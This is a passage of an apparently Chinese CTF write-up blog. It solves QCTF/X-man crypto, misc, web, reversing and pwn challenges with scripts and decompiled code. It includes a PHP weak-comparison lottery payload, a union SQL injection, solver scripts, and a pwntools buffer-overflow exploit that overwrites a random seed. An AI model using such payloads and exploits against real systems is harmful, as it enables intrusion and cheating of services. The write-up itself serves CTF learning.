key_len%16!=0: key_len=(key_len/16)*16+16 key_len*=4 trun_len=4*real_len for i in range(0,trun_len,64): run_code=code_string[i:i+64] l=i%key_len run_key=code_key[l:l+64] run_code= self._codefirstchange(run_code) run_key= self._keyfirstchange(run_key) for j in range(16): code_r=run_code[32:64] code_l=run_code[0:32] run_code=code_r code_r= self._functionE(code_r) key_l=run_key[0:28] key_r=run_key[28:56] key_l=key_l[d[j]:28]+key_l[0:d[j]] key_r=key_r[d[j]:28]+key_r[0:d[j]] run_key=key_l+key_r key_y= self._functionKeySecondChange(run_key) code_r= self._codeyihuo(code_r,key_y) code_r= self._functionS(code_r) code_r= self._functionP(code_r) code_r= self._codeyihuo(code_l,code_r) run_code+=code_r code_r=run_code[32:64] code_l=run_code[0:32] run_code=code_r+code_l output+=self._functionCodeChange(run_code) return output def _codeyihuo(self,code,key): code_len=len(key) return_list='' for i in range(code_len): if code[i]==key[i]: return_list+='0' else: return_list+='1' return return_list def _codefirstchange(self,code): changed_code='' for i in range(64): changed_code+=code[ip[i]-1] return changed_code def _keyfirstchange (self,key): changed_key='' for i in range(56): changed_key+=key[pc1[i]-1] return changed_key def _functionCodeChange(self, code): lens=len(code)/4 return_list='' for i in range(lens): list='' for j in range(4): list+=code[ip_1[i*4+j]-1] return_list+=\"%x\" %int(list,2) return return_list def _functionE(self,code): return_list='' for i in range(48): return_list+=code[e[i]-1] return return_list def _functionP(self,code): return_list='' for i in range(32): return_list+=code[p[i]-1] return return_list def _functionS(self, key): return_list='' for i in range(8): row=int( str(key[i*6])+str(key[i*6+5]),2) raw=int(str( key[i*6+1])+str(key[i*6+2])+str(key[i*6+3])+str(key[i*6+4]),2) return_list+=self._functionTos(s[i][row][raw],4) return return_list def _functionKeySecondChange(self,key): return_list='' for i in range(48): return_list+=key[pc2[i]-1] return return_list def _functionCharToA(self,code,lens): return_code='' lens=lens%16 for key in code: code_ord=int(key,16) return_code+=self._functionTos(code_ord,4) if lens!=0: return_code+='0'*(16-lens)*4 return return_code def _functionTos(self,o,lens): return_code='' for i in range(lens): return_code=str(o&gt;&gt;i &amp;1)+return_code return return_codedef tohex(string): return_string='' for i in string: return_string+=\"%02x\"%ord(i) return return_stringdef tounicode(string): return_string='' string_len=len(string) for i in range(0,string_len,2): return_string+=chr(int(string[i:i+2],16)) return return_stringdef desencode(from_code,key): from_code=tohex(from_code) key=tohex(key) des=DES() key_len=len(key) string_len=len(from_code) if string_len&lt;1 or key_len&lt;1: print 'error input' return False key_code= des.code(from_code,key,string_len,key_len) return key_codeif __name__ == '__main__': if(desencode(sys.argv[1],'mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf')=='e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72'): print 'correct.' else: print 'try again.' 解出来之后发现应该是 DES，但无从下手。后来看了孔师傅的 wp，一惊居然还有这种骚操作。 顺便记录一下__all__在 python 中： 1The only solution is for the package author to provide an explicit index of the package. The import statement uses the following convention: if a package’s init.py code defines a list named all, it is taken to be the list of module names that should be imported when from package import * is encountered. It is up to the package author to keep this list up-to-date when a new version of the package is released. Package authors may also decide not to support it, if they don’t see a use for importing * from their package. 最后用搜到的脚本解密： 1234567$ python des_1.pyDES 解密请输入密文（长度不限）:e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72请输入密钥（长度不限）:mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sfQCTF&#123;eCy0AALMDH9rLoBnWnTigXpYPkgU0sU4&#125;按确定退出 Noise拿到一个Noise.wav，发现是my little pony theme song。尝试用mp3stego后无果。再反复听了很多次，发现有一些噪音夹杂在里面。 看一下 hint，个人认为这里最关键的是 hint2，需要了解通过消除伴奏获得人声的原理。 关于原理，利用声波叠加干涉消除原声，当声波的相位差达到 180 度的时候，就可以达到消音的效果： 跟着教程学会怎么使用Adobe Audition，使声波相位差达到 180 度。 要提取出噪音，我们要做的就是从网上下载原版的my little pony theme song，然后将Noise.wav和它的相位差调整为 180 度，就可以提取出噪音。 关于这段噪音的话，和慢扫描电视有关。利用软件MMSSTV，最后得到 flag。 X-man-Keyword也是 lsb。 密码为图片中的lovekfc。 通过提示，将LOVEKFC作为关键字提到最前面，和正常顺序的英文字母进行置换。 1234567PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;LOVEKFCABDGHIJMNPQRSTUWXYZABCDEFGHIJKLMNOPQRSTUVWXYZQCTF...// 容易发现前四位正好是QCTF 写一下脚本跑出结果： 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;int main() &#123; char s1[27] = \"lovekfcabdghijmnpqrstuwxyz\"; char s2[27] = \"abcdefghijklmnopqrstuvwxyz\"; char s3[27] = \"LOVEKFCABDGHIJMNPQRSTUWXYZ\"; char s4[27] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; char ans[39] = \"PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;\"; for(int i = 0; i &lt; strlen(ans); i++) &#123; if(islower(ans[i])) &#123; for(int j = 0; j &lt; strlen(s1); j++) &#123; if(ans[i] == s1[j]) &#123; ans[i] = s2[j]; break; &#125; &#125; &#125; else if(isupper(ans[i])) &#123; for(int j = 0; j &lt; strlen(s3); j++) &#123; if(ans[i] == s3[j]) &#123; ans[i] = s4[j]; break; &#125; &#125; &#125; else &#123; continue; &#125; &#125; printf(\"%s\", ans); return 0;&#125; X-man-A face补全二维码定位符，扫出一串类似 base64 的密文。 经过尝试，通过 base32 解码得到 flag。 WEBLottery通过 GitHack 拿到源码，在 api.php 中： 123456789101112function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION['money']; $numbers = $req['numbers']; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; $numbers即用户输入的数字，$win_numbers即随机生成的数字。根据 PHP 弱类型比较，例如TRUE和1和&quot;1&quot;相等，构造&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]即可中最高奖，得到 flag。 NewsCenter直接用联合注入判断出列数为三列后，就开始走流程 emmm。 显而易见 flag 应该在secret_table中。 在fl4g列中得到 flag： REXman-babymipsmips 逆向，看一下swing 的博客，安装一波 retdec 来反编译。 反编译出几个关键函数： check 函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdbool.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t puts(char * a1);int32_t strlen(char * a1);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(char * a1);// --------------------- Global Variables ---------------------char * g1 = \"\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\";// ------------------------ Functions -------------------------// Address range: 0x4007f0 - 0x4009a8int32_t sub_4007F0(char * a1) &#123; int32_t v1 = (int32_t)a1; // 0x400800 char * str = (char *)v1; // 0x400800 int32_t puts_rc; if (strlen(str) &lt;= 5) &#123; // 0x400934 if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) &#123; // 0x400964 puts_rc = puts(\"Right!\"); // branch -&gt; 0x40098c &#125; else &#123; // 0x40097c puts_rc = puts(\"Wrong!\"); // branch -&gt; 0x40098c &#125; // 0x40098c return puts_rc; &#125; int32_t v2 = 5; while (true) &#123; char * v3 = (char *)(v2 + v1); // 0x4008a8 int32_t v4 = (int32_t)*v3; // 0x4008a8 char v5; if (v2 % 2 == 0) &#123; char v6 = *v3; // 0x4008cc v5 = (int32_t)v6 / 64 | 0x4000000 * v4 / 0x1000000; // branch -&gt; 0x400900 &#125; else &#123; // 0x400828 v5 = 64 * (int32_t)*v3 | v4 / 4; // branch -&gt; 0x400900 &#125; // 0x400900 *v3 = v5; int32_t v7 = v2 + 1; // 0x400908 if (v7 &gt;= strlen(str)) &#123; // break -&gt; 0x400934 break; &#125; v2 = v7; // continue -&gt; 0x400814 &#125; // 0x400934 if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) &#123; // 0x400964 puts_rc = puts(\"Right!\"); // branch -&gt; 0x40098c &#125; else &#123; // 0x40097c puts_rc = puts(\"Wrong!\"); // branch -&gt; 0x40098c &#125; // 0x40098c return puts_rc;&#125;// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:29 逻辑就是先判断奇偶，如果为奇数则将字符的高 6 位作为低 6 位，低 2 位作为高 2 位；反之为偶数，则字符的低 6 位作为高 6 位，高 2 位作为低 2 位。最后和g1check 一下。 main 函数在这里： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t printf(char * a1);int32_t puts(char * a1);int32_t scanf(char * a1);void setbuf(int32_t a1, char * a2);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(int32_t a1);int32_t sub_4009A8(void);// --------------------- Global Variables ---------------------int32_t stdin = 0;int32_t stdout = 0;// ------------------------ Functions -------------------------// Address range: 0x4009a8 - 0x400af8int32_t sub_4009A8(void) &#123; // 0x4009a8 setbuf(stdout, NULL); setbuf(stdin, NULL); printf(\"Give me your flag:\"); scanf(\"%32s\"); int32_t v1 = 0; // bp-48 int32_t v2 = 0; // 0x400a58 char * v3 = (char *)((int32_t)&amp;v1 + 4 + v2); // 0x400a28 *v3 = (char)((int32_t)*v3 ^ 32 - v2); int32_t v4 = v1 + 1; // 0x400a70 v1 = v4; // branch -&gt; 0x400a1c while (v4 &lt; 32) &#123; // 0x400a1c v2 = v4; v3 = (char *)((int32_t)&amp;v1 + 4 + v2); *v3 = (char)((int32_t)*v3 ^ 32 - v2); v4 = v1 + 1; v1 = v4; // continue -&gt; 0x400a1c &#125; int32_t str = 0; // bp-44 int32_t puts_rc; if (strncmp((char *)&amp;str, \"Q|j&#123;g\", 5) == 0) &#123; // 0x400ab4 puts_rc = sub_4007F0((int32_t)&amp;str); // branch -&gt; 0x400adc &#125; else &#123; // 0x400acc puts_rc = puts(\"Wrong\"); // branch -&gt; 0x400adc &#125; // 0x400adc return puts_rc;&#125;// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:58 main 中先输入字符串，然后将字符串中的每个字符依次与32-i异或，前五位与Q|j{g比较，之后将字符串作为参数调用上一个 check 函数。 由于之前的奇偶难以判断，所以采用爆破的方式。用 python 写出爆破脚本： 123456789101112131415161718192021#!/usr/bin/env pythonenc1 = 'Q|j&#123;g'enc2 = '\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f'flag = ''for i in range(5): ch = ord(enc1[i]) ^ (32 - i) print 'index', i, '==&gt;', chr(ch) flag += chr(ch)for i in range(5, 32): for ch in range(256): t = ch ^ (32 - i) if i % 2 == 0: res = ((t &lt;&lt; 2) &amp; 0xff) | (t &gt;&gt; 6) else: res = (t &gt;&gt; 2) | ((t &lt;&lt; 6) &amp; 0xff) if res == ord(enc2[i - 5]): print 'index', i, '==&gt;', chr(ch) flag += chr(ch) breakprint len(flag)print 'flag:', flag 最后放上官方给出的源码： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;char *check1=\"Q|j&#123;g\";char *check2= \"\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\";void check(char *s)&#123; int i; for(i=5;i&lt;strlen(s);i++)&#123; if(i%2) s[i]=(s[i]&gt;&gt;2)|((s[i]&lt;&lt;6)&amp;0xff); else s[i]=((s[i]&lt;&lt;2)&amp;0xff)|(s[i]&gt;&gt;6); &#125; if(!strncmp(&amp;s[5],check2,27)) printf(\"Right!\\n\"); else printf(\"Wrong!\\n\");&#125;void main()&#123; char s[33]; int i; printf(\"Give me your flag:\"); scanf(\"%32s\",s); for(i=0;i&lt;32;i++) s[i]^=(32-i); if(!strncmp(s,check1,5)) check(s); else printf(\"Wrong\\n\");&#125; asong总共给了三个文件，asong为可执行文件，that_girl以及out都是 ascii 文本。将asong拖进 ida 后，看到 main 函数的样子： 1234567891011121314__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void *girl; // ST00_8 char *input; // ST08_8 girl = malloc(0xBCuLL); input = (char *)malloc(0x50uLL); init_func(); getline(input); simple_check(input); cal(\"that_girl\", (__int64)girl); encrypt(input, (__int64)girl); return 0LL;&#125; 第一个init_func()，设置一下缓冲区： 123456void init_func()&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL);&#125; getline()函数实现了一个简单的读取一行的功能： 12345678910111213141516171819char __fastcall getline(char *a1)&#123; char *v1; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) &#123; LOBYTE(v1) = read(0, &amp;a1[i], 1uLL) == 1; if ( !(_BYTE)v1 ) break; if ( a1[i] == 10 || i &gt; 100 ) &#123; v1 = &amp;a1[i]; *v1 = 0; return (char)v1; &#125; &#125; return (char)v1;&#125; simple_check()函数检查读入字符串中是否以&#39;QCTF{&#39;开头，以及是否以&#39;}&#39;结尾： 123456789101112131415void __fastcall simple_check(char *a1)&#123; int v1; // [rsp+14h] [rbp-Ch] void *dest; // [rsp+18h] [rbp-8h] dest = malloc(0x50uLL); if ( memcmp(a1, \"QCTF&#123;\", 5uLL) ) exit(-1); memcpy(dest, a1 + 5, 0x4BuLL); v1 = strlen((const char *)dest); if ( *((_BYTE *)dest + v1 - 1) == '&#125;' ) *((_BYTE *)dest + v1 - 1) = 0; memcpy(a1, dest, 0x50uLL); free(dest);&#125; cal()函数读取了文件that_girl的内容，应该是通过convert()函数对其中的每个字符做了一个词频的统计： 1234567891011121314151617int __fastcall cal(const char *that_girl, __int64 girl)&#123; int v2; // eax char *v4; // [rsp+0h] [rbp-20h] char buf; // [rsp+13h] [rbp-Dh] int fd; // [rsp+14h] [rbp-Ch] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); fd = open(that_girl, 0, girl, that_girl); while ( read(fd, &amp;buf, 1uLL) == 1 ) &#123; v2 = convert(buf); ++*(_DWORD *)&amp;v4[4 * v2]; &#125; return close(fd);&#125; convert()函数中是一个对读入的 buf 的映射，不用刻意看具体是什么操作，后面直接打表就完事了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__int64 __fastcall convert(char buf)&#123; __int64 result; // rax result = (unsigned int)(buf - 10); switch ( buf ) &#123; case '\\n': result = (unsigned int)(buf + 35); break; case ' ': case '!': case '\"': result = (unsigned int)(buf + 10); break; case '\\'': result = (unsigned int)(buf + 2); break; case ',': result = (unsigned int)(buf - 4); break; case '.': result = (unsigned int)(buf - 7); break; case ':': case ';': result = (unsigned int)(buf - 21); break; case '?': result = (unsigned int)(buf - 27); break; case '_': result = (unsigned int)(buf - 49); break; default: if ( buf &lt;= '/' || buf &gt; '9' ) &#123; if ( buf &lt;= '@' || buf &gt; 'Z' ) &#123; if ( buf &gt; '`' &amp;&amp; buf &lt;= 'z' ) result = (unsigned int)(buf - 87); // lower case &#125; else &#123; result = (unsigned int)(buf - 55); // upper case &#125; &#125; else &#123; result = (unsigned int)(buf - 48); // number &#125; break; &#125; return result;&#125; 最后是对 flag 的加密部分： 12345678910111213141516unsigned __int64 __fastcall encrypt(const char *input, char *girl)&#123; int i; // [rsp+18h] [rbp-48h] int len; // [rsp+1Ch] [rbp-44h] char enc[56]; // [rsp+20h] [rbp-40h] unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); len = strlen(input); for ( i = 0; i &lt; len; ++i ) enc[i] = *(_DWORD *)&amp;girl[4 * (signed int)convert(input[i])]; index_round(enc); shift(enc, len); output(enc, \"out\", len); return __readfsqword(0x28u) ^ v6;&#125; 这里用到了一个 global 的 table，和之前的词频一样，通过打表将映射关系记录下来： 12345678910111213141516__int64 __fastcall index_round(char *enc)&#123; __int64 result; // rax _BYTE v2[5]; // [rsp+13h] [rbp-5h] v2[4] = 0; // v2[1] = 0; *(_DWORD *)v2 = (unsigned __int8)*enc; while ( table[*(signed int *)&amp;v2[1]] ) &#123; enc[*(signed int *)&amp;v2[1]] = enc[table[*(signed int *)&amp;v2[1]]]; *(_DWORD *)&amp;v2[1] = table[*(signed int *)&amp;v2[1]]; &#125; result = v2[0]; enc[*(signed int *)&amp;v2[1]] = v2[0]; return result;&#125; shift()做了一个循环位移，这个操作显然是可逆的： 12345678910111213char *__fastcall shift(char *enc, int len)&#123; char *result; // rax char v3; // [rsp+17h] [rbp-5h] int i; // [rsp+18h] [rbp-4h] v3 = (unsigned __int8)*enc &gt;&gt; 5; for ( i = 0; len - 1 &gt; i; ++i ) enc[i] = 8 * enc[i] | ((unsigned __int8)enc[i + 1] &gt;&gt; 5); result = &amp;enc[i]; *result = 8 * *result | v3; return result;&#125; output()函数将密文输出到out中： 123456789101112int __fastcall output(char *enc, const char *file, int len)&#123; int v4; // [rsp+Ch] [rbp-24h] int i; // [rsp+28h] [rbp-8h] int fd; // [rsp+2Ch] [rbp-4h] v4 = len; fd = open(file, 65, 438LL); for ( i = 0; i &lt; v4; ++i ) write(fd, &amp;enc[i], 1uLL); return close(fd);&#125; 总体加密过程统计了 that_girl 文件的词频, 并将 flag 转换为对应的词频。经过两次加密, 置换, 移位。最后在尝试中写出最后的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/env pythonf = open('out', 'rb')t = f.read()f.close()enc = []for i in range(len(t)): enc.append(ord(t[i]))print encflag = ''def convert(c): res = c - 10 if c == 10: res = c + 35 elif 32 &lt;= c &lt;= 34: res = c + 10 elif c == 39: res = c + 2 elif c == 44: res = c - 4 elif c == 46: res = c - 7 elif 58 &lt;= c &lt;= 59: res = c - 21 elif c == 63: res = c - 27 elif c == 95: res = c - 49 else: if c &lt;= 47 or c &gt; 57: if c &lt;= 64 or c &gt; 90: if c &gt; 96 and c &lt;= 122: res = c - 87 else: res = c - 55 else: res = c - 48 return res# convert1convert_map = &#123;&#125;for ch in range(256): convert_map[convert(ch)] = ch# print convert_mapf = open('that_girl', 'rb')that_girl = f.read()f.close()# print that_girlgirl = [0 for i in range(256)]for i in range(len(that_girl)): t = convert(that_girl[i]) girl[t * 4] += 1# print girl# shiftenc1 = []enc1.append(((enc[-1] &lt;&lt; 5) &amp; 0xff) | (enc[0] &gt;&gt; 3))for i in range(len(enc) - 1): enc1.append(((enc[i] &lt;&lt; 5) &amp; 0xff) | (enc[i + 1] &gt;&gt; 3))print len(enc1)table = [0x00000016, 0x00000000, 0x00000006, 0x00000002, 0x0000001E, 0x00000018, 0x00000009, 0x00000001, 0x00000015, 0x00000007, 0x00000012, 0x0000000A, 0x00000008, 0x0000000C, 0x00000011, 0x00000017, 0x0000000D, 0x00000004, 0x00000003, 0x0000000E, 0x00000013, 0x0000000B, 0x00000014, 0x00000010, 0x0000000F, 0x00000005, 0x00000019, 0x00000024, 0x0000001B, 0x0000001C, 0x0000001D, 0x00000025, 0x0000001F, 0x00000020, 0x00000021, 0x0000001A, 0x00000022, 0x00000023]print len(table)# convert2round_map = &#123;&#125;x = 0while table[x] != 0: round_map[table[x]] = x x = table[x]round_map[0] = 1print round_mapenc2 = [0 for i in range(len(enc1))]for origin, encoded in round_map.items(): enc2[origin] = enc1[encoded]for i in range(len(enc2)): for j in range(len(girl) / 4): if enc2[i] == girl[j * 4]: flag += chr(convert_map[j]) breakprint 'flag: QCTF&#123;%s&#125;' % flag ollvm题目给的 binary 很大，各种混淆，硬逆太困难了。pintool走一波，这里推荐一个脚本pinCTF（大概跑了一个半小时的样子）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182root@fea7928d5398:~/PinCTF# ./pinCTF.py -f ./ollvm -a -l obj-intel64/ -sl 38 -r abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_+=&#123;&#125; -sk[~] Status:threading : FalsereverseRange : FalseskipFavoredPaths : True[~] Trying &#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 0 using Q for QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying Q&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 1 using C for QCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QC&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 2 using T for QCTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCT&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 3 using F for QCTFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 4 using &#123; for QCTF&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 5 using 5 for QCTF&#123;5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 6 using Y for QCTF&#123;5YAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Y&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 7 using m for QCTF&#123;5YmAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 8 using 4 for QCTF&#123;5Ym4AAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 9 using a for QCTF&#123;5Ym4aAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4a&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 10 using O for QCTF&#123;5Ym4aOAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aO&#123;AAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 11 using E for QCTF&#123;5Ym4aOEAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOE&#123;AAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 12 using w for QCTF&#123;5Ym4aOEwAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEw&#123;AAAAAAAAAAAAAAAAAAAAAAAA[+] iter 13 using w for QCTF&#123;5Ym4aOEwwAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww&#123;AAAAAAAAAAAAAAAAAAAAAAA[+] iter 14 using 2 for QCTF&#123;5Ym4aOEww2AAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2&#123;AAAAAAAAAAAAAAAAAAAAAA[+] iter 15 using N for QCTF&#123;5Ym4aOEww2NAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2N&#123;AAAAAAAAAAAAAAAAAAAAA[+] iter 16 using c for QCTF&#123;5Ym4aOEww2NcAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2Nc&#123;AAAAAAAAAAAAAAAAAAAA[+] iter 17 using Z for QCTF&#123;5Ym4aOEww2NcZAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZ&#123;AAAAAAAAAAAAAAAAAAA[+] iter 18 using c for QCTF&#123;5Ym4aOEww2NcZcAAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZc&#123;AAAAAAAAAAAAAAAAAA[+] iter 19 using v for QCTF&#123;5Ym4aOEww2NcZcvAAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcv&#123;AAAAAAAAAAAAAAAAA[+] iter 20 using U for QCTF&#123;5Ym4aOEww2NcZcvUAAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvU&#123;AAAAAAAAAAAAAAAA[+] iter 21 using P for QCTF&#123;5Ym4aOEww2NcZcvUPAAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUP&#123;AAAAAAAAAAAAAAA[+] iter 22 using O for QCTF&#123;5Ym4aOEww2NcZcvUPOAAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPO&#123;AAAAAAAAAAAAAA[+] iter 23 using W for QCTF&#123;5Ym4aOEww2NcZcvUPOWAAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOW&#123;AAAAAAAAAAAAA[+] iter 24 using K for QCTF&#123;5Ym4aOEww2NcZcvUPOWKAAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWK&#123;AAAAAAAAAAAA[+] iter 25 using Y for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYAAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKY&#123;AAAAAAAAAAA[+] iter 26 using M for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMAAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYM&#123;AAAAAAAAAA[+] iter 27 using n for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnAAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMn&#123;AAAAAAAAA[+] iter 28 using P for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPAAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnP&#123;AAAAAAAA[+] iter 29 using a for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaAAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPa&#123;AAAAAAA[+] iter 30 using q for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqAAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaq&#123;AAAAAA[+] iter 31 using P for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPAAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqP&#123;AAAAA[+] iter 32 using y for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPyAAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPy&#123;AAAA[+] iter 33 using w for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywAAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPyw&#123;AAA[+] iter 34 using R for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywRAAA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR&#123;AA[+] iter 35 using 2 for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2AA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2&#123;A[+] iter 36 using m for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2mA[~] Trying QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m&#123;[+] iter 37 using &#125; for QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m&#125;[+] Found pattern QCTF&#123;5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m&#125; PWNXman-dice_game放进 ida 看 main 函数： buf 存在溢出，可以覆盖到 seed，使之为 0。想法就是通过爆破得到随机数的顺序。脚本： 1234567891011121314151617181920212223242526272829303132333435from pwn import *import randomimport timedef test(ans): p = process('./dice_game') # p = remote(\"47.96.239.28\", 9999) p.readuntil(\"name:\") payload = p64(0xabcdabcdabcdabcd) * 8 + p64(0) p.sendline(payload) i = 0 ans_len = len(ans) log.success(ans) if True: while i &lt; ans_len: p.readuntil(\"nt(1~6): \") n = ans[i] i += 1 p.sendline(n) random.seed(time.time()) n = str(int(random.randint(1, 6))) p.readuntil(\"nt(1~6): \") p.sendline(n) print(n) sub = p.readuntil('.') log.info(sub) return 